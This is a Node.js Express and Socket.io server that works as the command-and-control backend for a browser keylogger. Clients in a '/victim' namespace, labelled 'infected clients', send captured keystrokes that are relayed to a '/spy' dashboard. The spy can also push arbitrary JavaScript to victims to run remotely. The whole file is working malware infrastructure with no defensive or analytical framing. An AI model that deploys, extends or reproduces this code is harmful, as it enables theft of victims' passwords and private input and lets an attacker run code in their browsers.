const path = require("path");
const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const { Server } = require("socket.io");

const io = new Server(server);

app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.send("Server is running! Waiting for connections...");
});

// Spy namespace (Monitor Dashboard)
const spy = io.of("/spy").on("connection", (socket) => {
  console.log("A spy connected");

  socket.on("remoteJs", (js) => {
    console.log("spy/remoteJs:", js);
    victim.emit("runRemoteJs", js);
  });

  socket.on("disconnect", () => {
    console.log("Spy disconnected");
  });
});

// Victim namespace (Infected Clients)
const victim = io.of("/victim").on("connection", (socket) => {
  console.log("A victim connected");

  socket.on("update", (change) => {
    console.log("Victim keypress:", change); // ✅ Logs keystrokes in the terminal
    spy.emit("update", change); // ✅ Sends keystrokes to the spy
  });

  socket.on("disconnect", () => {
    console.log("Victim disconnected");
  });
});

server.listen(3000, () => {
  console.log("Listening on *:3000");
});
